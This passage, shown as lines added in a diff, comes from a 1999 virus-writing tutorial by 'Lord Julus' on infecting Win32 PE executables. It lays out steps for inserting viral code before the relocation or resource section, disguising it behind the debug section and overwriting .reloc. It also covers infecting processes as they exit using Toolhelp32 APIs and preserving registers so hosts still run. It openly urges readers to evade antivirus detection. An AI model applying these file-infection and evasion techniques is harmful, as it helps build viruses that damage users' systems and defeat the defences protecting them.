+        The  second  solution  could be to look up all the RVAs "by hand" and
+ update  them.  For that, you need to know exactly the specific layout of the
+ sections  following  the  virus,  in  order to be able to update them. This,
+ however,  is  almost impossible. Think of the code section. The code section
+ has no layout, and therefore cannot be relocated by hand. Other sections may
+ contain strange data, also impossible to find by hand. Bottom line, you MUST
+ insert  your  viral  code before a section who's layout you know and you can
+ rearrange it by hand.
+
+        In  my  search  I found that only two sections match the description:
+ the  relocation section and the resource section. Both sections are commonly
+ found  at  the  end of the PE file, and this I found in 100% of the PE files
+ that  I checked. Files that do not have relocations and resources at all are
+ mostly  CUI files (non graphical interface), basically files that run as the
+ DOS  files but they are however PE files. The process of inserting goes like
+ this:
+
+        S1: is there a relocation section in the file?
+            Yes: goto S2
+            No : goto S3
+
+        S2: is the relocation section last?
+            Yes: goto S7
+            No : goto S3
+
+        S3: is there a resource section in the file?
+            Yes: goto S4
+            No : goto S6
+
+        S4: is the resource section last?
+            Yes: goto S5
+            No : goto S6
+
+        S5: insert virus and rearrange the resource sections RVAs
+            goto S8
+
+        S6: abort infection
+
+        S7: insert virus with no rearrangements
+
+        S8: finish
+
+        I hope this is clear enough.
+
+        Now,  if  I  think about it a little more, I think it would be a good
+ thing  to  also  scan  if  the  last section is the debug section and if so,
+ insert before it and after that nulify the entry in the Data Directory which
+ points  to  the debug section. In this way, the file will "look" like having
+ the  debug  information  strip,  but  the  actual section body will still be
+ there, but useless.
+
+        About   the  resource  section rearrangement, check my pe file layout
+ where you have an example of resources browsing.
+
+
+       ____________________
+      /                   (
+     (  Interesting notes  )
+      )___________________/
+
+
+        Here  are  a couple of interesting notes around the win32 programming
+ which  I  found and they may be or not new to you, and you may find them not
+ so well arranged as I wrote them:
+
+        1.It  is  not necessary to set the Code and the Executable flags when
+ you  want  a certain section to contain code. This is because the x86 system
+ only  allows  two  types  of  flags: read and write. The code and executable
+ flags  are interpreted as the read flag. So, basically for your virus to run
+ it  is  enough  to  set  the  Read  and  Write flags. Note that ususally the
+ resource  section is already readable and writable, while the relocs section
+ is only readable.
+
+        2.A  good techinque for a win32 resident virus is to know exactly the
+ running  processes  and  to infect them as they end. To find out the running
+ processes you can use the Toolhelp32 techniques. The apis and structures you
+ need to know can be found in the WinSDK or inside the include directory in
+ the Visual C++, in the file THELP32.H. The apis are:
+
+        CreateToolhel32Snapshot - gets a snapshot handle which you use in
+                                  the following apis
+        Process32First          - get the entry for the first process
+        Process32Next           - get next process entry
+
+        In this way you will have all the file names of the running processes
+ in  the  array of strings. Your virus should repeat the process from time to
+ time  and  once  one of the file names disappeared, it means the process has
+ ended and can be infected.
+
+        This  technique might not work on some releases of WinNT, and you can
+ see it live in my Win32.Cargo virus.
+
+        3.In  a  Win95 specific virus you may not rearrange the SizeOfCode in
+ the PE header. In a WinNT compatible virus, you must do that.
+
+        4.Due  to  the  fact  that  the  relocations  are  obsolete,  you may
+ overwrite the .reloc section if it exists with your virus and mark in the PE
+ header  that the relocations are stripped from the file, and also reset to 0
+ the third entry in the Directory Entries.
+
+        5.Right after the Ms-Dos old header you can place a Int 20h and after
+ that you can put some data, until you reach the PE header.
+
+        6.To have a good and reliable virus, you must absolutely save all the
+ registers  and  flags  at  entry and restore them before jumping to the host
+ original  EIP. Even though the values at entry are not documented and should
+ not  be  used  directly,  some  of  the Microsoft applications use them, and
+ therefore you should take care of them.
+
+        7.As  win32 viruses tend to get more and more each day, however, they
+ tend to have a lot of things in common. Little by little parts of code, like
+ kernel32  look-up, api addresses search, PE structure check-up, are becoming
+ fixed  and alike in many sources. I am not saying that people copy code, but
+ they  tend  to  use the most simple way of doing the thing, and that because
+ the  win32 virus writing is still in it's incipient form. My opinion is that
+ after  your  first  win32  virus,  and after understanding all the stuff you
+ should  move  on  to  a  better  hiding of the things done in the code. This
+ because  already  there  exist  AVs  flagging for possible win32 viruses. Of
+ course, this is bad... My next article will concern win32 anti-flag methods.
+ Of  course,  polymorphism  is  the first thing to think of, but we can still
+ have  undetectable  code  without  polymoprhism or even encryption. Think of
+ that.
+
+        8.You might not align the new filesize of an infected file. The usual
+ method  is  to align it and then set the file pointer to the end of file and
+ mark the EOF there, then close the file. You can simplify all this using the
+ following API:
+
+        push <filesize>
+        push <map address>
+        call FlushViewOfFile
+
+        Where  <filesize> is the size of the file after it's increase and not
+ aligned.  The FlushViewOfFile Api will write to disk the file rounding it up
+ to page boundary, thus doing the same job. It's quicker and only takes three
+ lines to do it.
+
+
+       _____________
+      /            (
+     (  Final word  )
+      )____________/
+
+
+        I  hope this little addendum was of some help for you. I want you all
+ to  understand  that Win32 will get more and more complicated, *but*, in the
+ meantime, it is already very complicated. Not complicated, like difficult to
+ understand,  but  complicated  as  giving infinite posibilities. The fact is
+ that  probably  only  a very small part of it is well known. But, why are we
+ here  I  ask you? What else but to disclose the new opportunities, to baldly
+ go where noone has gone before, seek new worlds and new civilizations... No,
+ wait  a minute... I think I am in the wrong movie here ;-)) Anyway, the idea
+ is: keep on going!!
+
+                                            ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+                                            ³   Lord Julus - 1999    Û
+                                            ÀÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ
